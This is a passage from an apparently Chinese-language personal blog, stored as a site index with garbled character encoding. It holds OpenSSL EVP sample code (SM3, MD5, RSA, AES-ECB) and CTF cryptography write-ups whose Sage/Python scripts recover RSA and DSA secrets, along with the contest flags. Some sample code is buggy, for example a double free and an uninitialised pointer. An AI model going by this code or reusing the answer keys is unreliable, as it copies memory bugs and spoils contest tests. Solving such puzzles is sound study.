·ï¼Œå¯æ˜¯ctxç»“æ„ä¼šè‡ªå·±ä¸»åŠ¨æ¸…é™¤ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚ä»Šæ–°çš„ç¨‹åºåº”è¯¥ä½¿ç”¨EVP_DigestInit_exå’ŒEVP_DigestFinal_exå‡½æ•° } void test_sm3(){ printf(\u0026#34;start test SM3 digest\\n\u0026#34;); unsigned char md_value[EVP_MAX_MD_SIZE]; //ä¿å­˜è¾“å‡ºçš„æ‘˜è¦å€¼çš„æ•°ç»„ unsigned int md_len; EVP_MD_CTX *pmdctx = EVP_MD_CTX_new(); //EVPæ¶ˆæ¯ç»“æ„ä½“ char msg1[] = \u0026#34;Test Message1\u0026#34;; //å¾…è®¡ç®—æ‘˜è¦çš„æ¶ˆæ¯1 char msg2[] = \u0026#34;Test Message2\u0026#34;; //å¾…è®¡ç®—åªè¦çš„æ¶ˆæ¯2 int i=0; EVP_MD_CTX_init(pmdctx); //åˆå§‹åŒ–æ‘˜è¦ç»“æ„ä½“ //è®¾ç½®æ‘˜è¦ç®—æ³•å’Œå¯†ç ç®—æ³•å¼•æ“ï¼Œè¿™é‡Œå¯†ç ç®—æ³•ä½¿ç”¨SM3 //ç®—æ³•å¼•æ“ä½¿ç”¨OpenSSLé»˜è®¤å¼•æ“ï¼Œå³è½¯ç®—æ³• EVP_DigestInit_ex(pmdctx,EVP_sm3(),NULL); EVP_DigestUpdate(pmdctx,msg1,strlen(msg1)); //è°ƒç”¨æ‘˜è¦Updateè®¡ç®—msg1çš„æ‘˜è¦ EVP_DigestUpdate(pmdctx,msg2,strlen(msg2)); //è°ƒç”¨æ‘˜è¦Updateè®¡ç®—msg2çš„æ‘˜è¦ EVP_DigestFinal_ex(pmdctx,md_value,\u0026amp;md_len); //æ‘˜è¦ç»“æŸï¼Œè¾“å‡ºæ‘˜è¦å€¼ /* æ‰“å°ç»“æœ */ printf(\u0026#34;msgis: %s %sï¼š\\n\u0026#34;,msg1,msg2); for(i=0;i\u0026lt;md_len;i++) { printf(\u0026#34;%02X\u0026#34;,md_value[i]); } printf(\u0026#34;\\n\u0026#34;); EVP_MD_CTX_free(pmdctx); } int main() { printf(\u0026#34;Hello, OpenSSL!\\n\u0026#34;); /* åŠ è½½æ‰€æœ‰ç®—æ³• */ // OpenSSL_add_all_algorithms(); test_sm3(); //MD5 unsigned char msg1[] = \u0026#34;hello world\u0026#34;; unsigned char * output; test_md5(msg1,output); printf(\u0026#34;MD5(\\\u0026#34;%s\\\u0026#34;)=\u0026#34;,msg1); for (int i = 0; i \u0026lt; strlen(output); ++i) { printf(\u0026#34;%02X\u0026#34;,output[i]); } return 0; } openssl RSAå¯†é’¥å¯¹ç”Ÿæˆæ¨¡æ¿ # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;openssl/evp.h\u0026gt; #include \u0026#34;openssl/rsa.h\u0026#34; void Test_Rsa(){ /*1.newä¸€ä¸ªå…¬é’¥ctxå¯¹è±¡ æŒ‡å®šåŠ å¯†ç®—æ³•ç±»å‹ * 2.å¯¹å…¶åˆå§‹åŒ– * 3.è®¾ç½®rsaå‚æ•° * 4.æ­£å¼ç”Ÿæˆå¯†é’¥ * 5.é‡Šæ”¾ctx * */ printf(\u0026#34;hello RSA\\n\u0026#34;); EVP_PKEY * Rsa_Pkey=NULL; EVP_PKEY_CTX *Rsa_ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA,NULL); EVP_PKEY_keygen_init(Rsa_ctx); //å‰ä¸¤æ­¥å‡åœ¨åˆå§‹åŒ– ï¼ˆä¸èƒ½åˆåˆ°ä¸€èµ·å—ï¼‰ //EVP_PKEY_CTX_new() å‡½æ•°ä½¿ç”¨pkeyå¯†é’¥ç±»å‹å’Œ ENGINE eåˆ†é…å…¬é’¥ç®—æ³•ä¸Šä¸‹æ–‡ã€‚ // //EVP_PKEY_CTX_new_id() å‡½æ•°ä½¿ç”¨idå’Œ ENGINE eæŒ‡å®šçš„å¯†é’¥ç±»å‹åˆ†é…å…¬é’¥ç®—æ³•ä¸Šä¸‹æ–‡ EVP_PKEY_CTX_set_rsa_keygen_bits(Rsa_ctx,1024); EVP_PKEY_keygen(Rsa_ctx,\u0026amp;Rsa_Pkey); EVP_PKEY_CTX_free(Rsa_ctx); BIGNUM *d=0; // BIGNUM *e=0; // BIGNUM *n=0; EVP_PKEY_get_bn_param(Rsa_Pkey,\u0026#34;d\u0026#34;,\u0026amp;d); // EVP_PKEY_get_bn_param(Rsa_Pkey,\u0026#34;e\u0026#34;,\u0026amp;e); // EVP_PKEY_get_bn_param(Rsa_Pkey,\u0026#34;n\u0026#34;,\u0026amp;n); char *Hex_d; Hex_d = BN_bn2hex(d);//å¤§æ•°è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸² // BN_bn2dec() åè¿›åˆ¶ printf(\u0026#34; rsaç§é’¥é•¿åº¦=%dbits ç§é’¥åå…­è¿›åˆ¶å½¢å¼:\\n\u0026#34;,strlen(Hex_d)*4); printf(\u0026#34;\\n\u0026#34;); for (int i = 0; i \u0026lt; strlen(Hex_d); ++i) { printf(\u0026#34;%C\u0026#34;,Hex_d[i]); } printf(\u0026#34;\\n\u0026#34;); EVP_PKEY_CTX_free(Rsa_ctx); //é‡Šæ”¾ctx } int main(){ Test_Rsa(); return 0; } openssl å¯¹ç§°å¯†ç æ¨¡æ¿ aesecb # // // Created by 16953 on 2023/2/14. // #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;openssl/evp.h\u0026gt; #include \u0026lt;openssl/aes.h\u0026gt; int main(void) { /* * 1. new aesctx * 2.initex * 3.update * 4.final * 5.free * */ unsigned char key[32] = {1}; unsigned char iv[16] = {0}; unsigned char *inStr = \u0026#34;this is test string\u0026#34;; int inLen = strlen(inStr); int encLen = 0; int outlen = 0; unsigned char encData[1024]; printf(\u0026#34;source: %s\\n\u0026#34;,inStr); //åŠ å¯† EVP_CIPHER_CTX *ctx= EVP_CIPHER_CTX_new(); // ctx = EVP_CIPHER_CTX_new(); EVP_CipherInit_ex(ctx, EVP_aes_256_ecb(), NULL, key, iv, 1); EVP_CipherUpdate(ctx, encData, \u0026amp;outlen, inStr, inLen); encLen = outlen; EVP_CipherFinal(ctx, encData+outlen, \u0026amp;outlen); encLen += outlen; EVP_CIPHER_CTX_free(ctx); //è§£å¯† int decLen = 0; outlen = 0; unsigned char decData[1024]; EVP_CIPHER_CTX *ctx2= EVP_CIPHER_CTX_new(); EVP_CipherInit_ex(ctx2, EVP_aes_256_ecb(), NULL, key, iv, 0); EVP_CipherUpdate(ctx2, decData, \u0026amp;outlen, encData, encLen); decLen = outlen; EVP_CipherFinal(ctx2, decData+outlen, \u0026amp;outlen); decLen += outlen; EVP_CIPHER_CTX_free(ctx2); decData[decLen] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;decrypt: %s\\n\u0026#34;,decData); } EVP_å¯¹åº•å±‚æ¥å£è¿›è¡Œäº†å°è£…,ä½†å¯¹åˆå­¦è€…å’Œå¯¹å¯†ç ä½“ç³»äº†è§£ä¸åˆ°ä½çš„åŒå­¦æ¥è¯´ä¼šæ¯”ç›´æ¥è°ƒç”¨ä½çº§æ¥å£æŠ½è±¡è®¸å¤š\nåœ¨è°ƒç”¨ç»†èŠ‚ä¸ŠåŠ å¼ºå¯¹èµ„æºé”€æ¯(EVP_FREE)çš„é‡è§†\n","date":"15 February 2023","permalink":"/achieve/openssl_evp/","section":"archive","summary":"","title":"OpenSSL è°ƒç”¨EVPæ¡†æ¶ å‡ ç§åŠ å¯†æ¨¡å¼"},{"content":"","date":"11 February 2023","permalink":"/tags/nuil/","section":"Tags","summary":"","title":"Nuil"},{"content":"","date":"11 February 2023","permalink":"/categories/%E5%85%B6%E4%BB%96/","section":"Categories","summary":"","title":"å…¶ä»–"},{"content":" èŠ±äº†ä¸€ä¸‹åˆçœ‹é¢˜,è§£æ•°è¾ƒå¤šçš„ä¸‰ä¸ªé¢˜éš¾åº¦æ¯”è¾ƒç­¾åˆ°\nå°½ä¸€ç‚¹ç»µè–„ä¹‹åŠ›\nd3factor # æŸ¥è®ºæ–‡æå‡ºä¸€ä¸ªæœ‰é™åŸŸå¤šé¡¹å¼\næ„é€ å¥½aåç”¨sageè‡ªå¸¦çš„smallrootå°±èƒ½æ±‚å‡ºæ¥ï¼Œå…¶ä¸­å‡ºç°äº†ä¸€ä¸ªçµå¼‚äº‹ä»¶ï¼Œè‡ªå·±çš„ç”µè„‘æ±‚å„ç§LLLä¼šç›´æ¥ æš´æ¯™ï¼Œç”¨å®˜æ–¹åœ¨çº¿sageæåˆ°äº†æ•°æ®\nå¯¹ç»“æœå¤„ç†ï¼Œå¾—åˆ°pçš„å…­æ¬¡æ–¹\n#! /usr/bin/sage from hashlib import md5 import gmpy2 from sage.all import * from sage.groups.generic import bsgs from Crypto.Util.number import * # N = 1476751427633071977599571983301151063258376731102955975364111147037204614220376883752032253407881568290520059515340434632858734689439268479399482315506043425541162646523388437842149125178447800616137044219916586942207838674001004007237861470176454543718752182312318068466051713087927370670177514666860822341380494154077020472814706123209865769048722380888175401791873273850281384147394075054950169002165357490796510950852631287689747360436384163758289159710264469722036320819123313773301072777844457895388797742631541101152819089150281489897683508400098693808473542212963868834485233858128220055727804326451310080791 # e1 = 425735006018518321920113858371691046233291394270779139216531379266829453665704656868245884309574741300746121946724344532456337490492263690989727904837374279175606623404025598533405400677329916633307585813849635071097268989906426771864410852556381279117588496262787146588414873723983855041415476840445850171457530977221981125006107741100779529209163446405585696682186452013669643507275620439492021019544922913941472624874102604249376990616323884331293660116156782891935217575308895791623826306100692059131945495084654854521834016181452508329430102813663713333608459898915361745215871305547069325129687311358338082029 # e2 = 1004512650658647383814190582513307789549094672255033373245432814519573537648997991452158231923692387604945039180687417026069655569594454408690445879849410118502279459189421806132654131287284719070037134752526923855821229397612868419416851456578505341237256609343187666849045678291935806441844686439591365338539029504178066823886051731466788474438373839803448380498800384597878814991008672054436093542513518012957106825842251155935855375353004898840663429274565622024673235081082222394015174831078190299524112112571718817712276118850981261489528540025810396786605197437842655180663611669918785635193552649262904644919 # a = (e2-e1)*inverse_mod(e1*e2,N) # PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(N)) # f=x-a # x0 = f.small_roots(X=2^1000, beta=0.4) # x0 = 1476751427633071977599571983301151063258376731102955975364111147037204614220376883752032253407881568290520059515340434632858734689439268479399482315506043425541162646523388437842149125178447800616137044219916586942207838674001004007237861470176454543718752182312318068466051713087927370670177514666860822341380494148050832401609562069841131611670608508889564903156115171543356434938854665775998209034026454583918190592316542096833683522232732078346945883792128428219017665904611238598515356080299964332522186719141840239751107772675611703424971072329706974374008179321418610378586680426547416872428073384036373775613 # print(x0) # ans = f(x0) # p = gcd(ans,N) # print(p) # print(isPrime(p)) # p = 302041005420039804788837973713898327221537364540217123524277085489425015387406302827931741511110799839253993542589980437030294737549654496720894473925249726898113670841165053274897225331487693822448903890664321018179858685020471572484115220669783927170647297629616743131628132318835058700355916820746650505209238111625956099990183829787016000154371928717007922683297772484179270642107118214144502646097942422343431687478702790785714060858198343943546186776012201 # print(gmpy2.iroot(p,int(6))) p = 81911394167511996830305370213894554209992159667974516868378702592733037962549 q = N//(p**7) q = 59689394622751323780317475130818337618980301243859922297121750335804594909859 c = 2420624631315473673388732074340410215657378096737020976722603529598864338532404224879219059105950005655100728361198499550862405660043591919681568611707967 e = 0x10001 N = p*q phi = (p-1)*(q-1) d = inverse(e,phi) m = pow(c,d,N) msg = long_to_bytes(m) print(msg) flag = \u0026#39;d3ctf{\u0026#39;+md5(msg).hexdigest()+\u0026#39;}\u0026#39; print(flag) flag d3ctf{42f79e777e622aef5344b04ad6233130}\nd3bug # çº¿æ€§ä»£æ•°é—®é¢˜ï¼ŒæŠŠ$r0 \u0026hellip;. r63$ç•™åœ¨ç­‰å·å·¦è¾¹ï¼Œå·²çŸ¥é‡r64~r98ç§»åˆ°ç­‰å·å³è¾¹\nå¾—åˆ°å…³äºr0~r63çš„70ç»„æ–¹ç¨‹\næ„é€ çŸ©é˜µå‘ç°çŸ©é˜µçš„ç§©åˆšå¥½ä¸º64ï¼Œæ±‚æœ€ç®€çŸ©é˜µå»æ‰çº¿æ€§ç›¸å…³çš„å‘åˆšå¥½å¾—åˆ°r0~r63çš„å€¼\næ±‚ç­‰å·å·¦è¾¹çš„ä»£ç ï¼š\nmask = \u0026#39;1010010000001000000010001001010010100100000010000000100010010100\u0026#39; mask = [int(i) for i in mask ] r1 = \u0026#39;01111101111010111000010010111001101\u0026#39; r2 = \u0026#39;00100110001000110001101010101001001\u0026#39; r1 = [int(i) for i in r1] r2 = [int(i) for i in r2] x1 = [0 for i in range(35)] for i in range(35): A = r1[i] B = 0 # print(\u0026#39;i\u0026#39;,i) for j in range(1,i+1): B^=(r1[i-j]\u0026amp;mask[64-j]) x = A^B x1[i]=x # ============================================ print(r2) x2 = [0 for i in range(35)] for i in range(35): A = r2[i] B = 0 print(\u0026#39;i\u0026#39;,i) for j in range(1,i+1): print(i-j) B^=r2[i-j] # print(A,B) x = A ^ B # print(\u0026#39;x\u0026#39;,x) # input() x2[i]=x print(\u0026#39;x1=\u0026#39;,x1) print(\u0026#39;x2=\u0026#39;,x2) # x1= [1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0] # x2= [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1] æ„é€ çŸ©é˜µä»¥åŠæ±‚æœ€ç®€çŸ©é˜µçš„ä»£ç \n#! /usr/bin/sage from sage.all import * from sage.groups.generic import bsgs from Crypto.Util.number import * mask = \u0026#39;1010010000001000000010001001010010100100000010000000100010010100\u0026#39; mask = [int(i) for i in mask ] # mask = [i for i in range(len( mask) )] # M=0 # for i in mask: # M^=i # print(M) m=0 x1= [0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1] x2= [0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0] r1=x1 r2=x2 print(len(r1),len(r2)) matrix1 = [[0 for i in range(65)] for i in range(70)] for i in range(35): for j in range(i,64): matrix1[i][j]=mask[j-i] matrix1[i][64]=r1[i] for i in range(35,70): for j in range(i-35,64): matrix1[i][j]=1 matrix1[i][64]=r2[i-35] # print(matrix1) M = matrix1 F = GF(2) M1 = Matrix(F,M) M1 = M1.rref() print(M1.rank()) M2 = M1[:64,:-1] ans = M1[:64,64:] print(M2) print(ans) flag=\u0026#39;\u0026#39; for i in ans: print(i[0]) flag += str(i[0]) print(flag) l2bå¾—åˆ°flag\nflag D3CTF{LF5Rsuk!}\n","date":"8 March 2022","permalink":"/achieve/ctf/d3ctf2022/","section":"archive","summary":"","title":"d3ctf2022ğŸ§€ğŸ§€ğŸ§€"},{"content":" ä¾æ—§æ˜¯ç¥ä»™æ‰“æ¶çš„PYå¤§èµ›\né¢˜çš„è´¨é‡ä¹Ÿä¸€èˆ¬ï¼Œæ˜¯ä¸ºäº†æ‹–æ—¶é—´æ‹‰é•¿æˆ˜çº¿å‡ºçš„é¢˜ï¼Œå˜›ï¼Œå¤§ä¼™æœ‰é’±èµšå°±è¡Œï¼Œ\nè¿™ç‚¹é¢„ç®—è¿˜æƒ³è¦åŸåˆ›ï¼Ÿ\nç¬‘å–œäº†\nè¥¿æ¹–è®ºå‰‘2021Crypto # å¯†ç äººé›†åˆ # æ•°ç‹¬é¢˜,å±å®ç»·ä¸ä½äº†,è®°ä¸€ä¸‹å·²ç»æœ‰äººå‡ºå›½è¿™ç§é¢˜äº†ä»¥åä¸èƒ½å‡ºäº†ğŸ„ğŸ„ğŸ„\nhardrsa # src\nfrom Crypto.Util.number import * import gmpy2 from secret import flag p = getPrime(512) q = getPrime(512) n = p**4*q e = 65537 phi = gmpy2.lcm(p - 1, q - 1) d = gmpy2.invert(e, phi) dp = d % (p - 1) m = bytes_to_long(flag) c = pow(m, e, n) print (\u0026#34;dp = \u0026#34; + str(dp)) print (\u0026#34;c = \u0026#34; + str(c)) y = 449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839 g = 2 x = 2019*p**2 + 2020*p**3 + 2021*p**4 c1 = pow(g, x, y) print( \u0026#34;c1 = \u0026#34; + str(c1)) # dp = 379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473 # c = 57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425 # c1 = 78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059 å–œé—»ä¹è§çš„æ•°å­¦é¢˜+ç¦»æ•£å¯¹æ•°å½¢å¼\næ¨ä¸‹å…¬å¼ ç”¨sageä¸€æŠŠæ¢­å“ˆ\nfrom Crypto.Util.number import * import sympy dp= 379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473 c = 57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425 c1= 78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059 y = 449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839 g = 2 x = sympy.discrete_log(y, c1, g) p = sympy.symbols(\u0026#34;p\u0026#34;) a = sympy.solve([2019*p**2 + 2020*p**3 + 2021*p**4-x], [p]) #print(a) p = 12131601165788024635030034921084070470053842112984866821070395281728468805072716002494427632757418621194662541766157553264889658892783635499016425528807741 m = pow(c, dp, p) print(long_to_bytes(m)) unknown_dsa # å¬è¯´è¦ç”¨ä»€ä¹ˆå‹¾å…«ä½©å°”æ–¹ç¨‹åš\nå’±ä»¬å¤§ä¸“äººä¸‹äººä¹Ÿä¸æ‡‚é‚£äº›\nç›´æ¥è¿åˆ†æ•°ä¸€æŠŠæ¢­å“ˆğŸ‘¨â€ğŸ“ğŸ‘¨â€ğŸ“ğŸ‘¨â€ğŸ“\nè¿åˆ†æ•°æ‰“é‡è¦å‚æ•°\n#! /usr/bin/sage from gmpy2 import iroot from icecream import * from sage.all import * from sage.groups.generic import bsgs from Crypto.Util.number import * w = [3912956711, 4013184893, 3260747771] c1 = [2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704, 21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961, 301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424] c2 = [148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144, 1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256, 10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842] def finduv(w): # w = 3912956711 sqrt_w = sqrt(w).n(2000) print(sqrt_w) for uv in continued_fraction(sqrt_w).convergents(): u = uv.numerator() v = uv.denominator() # input() # ic(u,v) if(u**2 - w*v**2\u0026lt;20 and u**2 - w*v**2\u0026gt;0): ic(u,v) ic(u**2 - w*v**2) return u,v uu=[] vv =[] for wi in w: u,v = finduv(wi) uu.append(u) vv.append(v) print(len(uu),len(vv)) print(uu) print(vv) \u0026#39;\u0026#39;\u0026#39; uu = [3246103877570376338979874480058302388590234989573846048429589091918737949572620392050082083210013471538484670450175602957972442230909, 121723653124334943327337351369224143389428692536182586690052931548156177466437320964701609590004825981378294358781446032392886186351422728173975231719924841105480990927174913175897972732532233, 1440176324831562539183617425199117363244429114385437232965257039323873256269894716229817484088631407074328498896710966713912857642565350306252498754145253802734893404773499918668829576304890397994277568525506501428687843547083479356423917301477033624346211335450] vv = [51893133018606205089677829160555654307824024355546397002081760065608182810917693193575928567213487534685441075575788061525676783, 1921455776649552079281304558665818887261070948261008212148121820969448652705855804423423681848341600084863078530401518931263150887409200101780191600802601105030806253998955929263882382004, 25220695816897075916217095856631009012504127590059436393692101250418226097323331193222730091563032067314889286051745468263446649323295355350101318199942950223572194027189199046045156046295274639977052585768365501640340023356756783359924935106074017605019787] w = [3912956711, 4013184893, 3260747771] cu = [2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704, 21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961, 301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424] cv = [148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144, 1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256, 10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842] ans1 = int(crt(cv,vv)) print(iroot(ans1,int(7))) m2 = 10336852405630488944198347577475266693234960398137850045398990629116544863921454 uu2 = [iroot(int(1+w[i]*vv[i]**2),int(2)) for i in range(3)] print(uu2) print(uu) \u0026#39;\u0026#39;\u0026#39; å–œé—»ä¹è§æ‰“DSA\n# from sage.all import * # from sage.groups.generic import bsgs from Crypto.Util.number import * from Crypto.PublicKey import DSA from Crypto.Hash import SHA from gmpy2 import invert,powmod,iroot import random from Crypto.Util.number import * m1=b\u0026#39;Hello, this is the first message.\u0026#39; m2=b\u0026#39;YES!! that is the second message.\u0026#39; n, t, invg, = 85198615386075607567070020969981777827671873654631200472078241980737834438897900146248840279191139156416537108399682874370629888207334506237040017838313558911275073904148451540255705818477581182866269413018263079858680221647341680762989080418039972704759003343616652475438155806858735982352930771244880990190318526933267455248913782297991685041187565140859, 106239950213206316301683907545763916336055243955706210944736472425965200103461421781804731678430116333702099777855279469137219165293725500887590280355973107580745212368937514070059991848948031718253804694621821734957604838125210951711527151265000736896607029198, 60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548 r1, s1, s2 = 498841194617327650445431051685964174399227739376, 376599166921876118994132185660203151983500670896, 187705159843973102963593151204361139335048329243 r2, s3 = 620827881415493136309071302986914844220776856282, 674735360250004315267988424435741132047607535029 h1 = bytes_to_long(SHA.new(m1).digest()) h2 = bytes_to_long(SHA.new(m2).digest()) # è§£æ–¹ç¨‹ \u0026#39;\u0026#39;\u0026#39; a=1 b=-1 c=-n*t delta = b**2-4*a*c print(delta) print(iroot(delta,2)) p = (-b+iroot(delta,2)[0])//(2*a) \u0026#39;\u0026#39;\u0026#39; q = 895513916279543445314258868563331268261201605181 p = 95139353880772104939870618145448234251031105153406565833029787299040378395002190438381537974853777890692924407167823818980082672873538133127131356810153012924025270883966172420658777903337576027105954119811495411149092960422055445121097259802686960288258399754185484307350305454788837702363971523085335074839 k = (h1-h2)*inverse(s1-s2,q) x1 = ((s1*k-h1)*inverse(r1,q))%q print(x1) flag=b\u0026#39;\u0026#39; flag+=long_to_bytes(x1) # b\u0026#39;DASCTF{f11bad18f5297\u0026#39; x1 = 389668174084597613214310991510959871854822701367 g = inverse(invg,n) r2 = powmod(g, x1, p) % q x2 = ((s3*k-h1)*inverse(r2,q))%q print(x2) flag+=long_to_bytes(x2) print(flag) q = 895513916279543445314258868563331268261201605181 p = 95139353880772104939870618145448234251031105153406565833029787299040378395002190438381537974853777890692924407167823818980082672873538133127131356810153012924025270883966172420658777903337576027105954119811495411149092960422055445121097259802686960288258399754185484307350305454788837702363971523085335074839 # DASCTF{f11bad18f529750fe52c56eed85d001b} SpecialCurve2 # è¿™ä¸ªè¿˜æœ‰ç‚¹æ„æ€ï¼Œæ„Ÿè§‰æ˜¯æŸç ”ç©¶ç”ŸğŸ‘´æ‹¿æ¥æå¿ƒæ€çš„\nå¥½éš¾å¥½éš¾å¥½éš¾\næŠŠåº•å±‚å¤§ä¸“é¼ 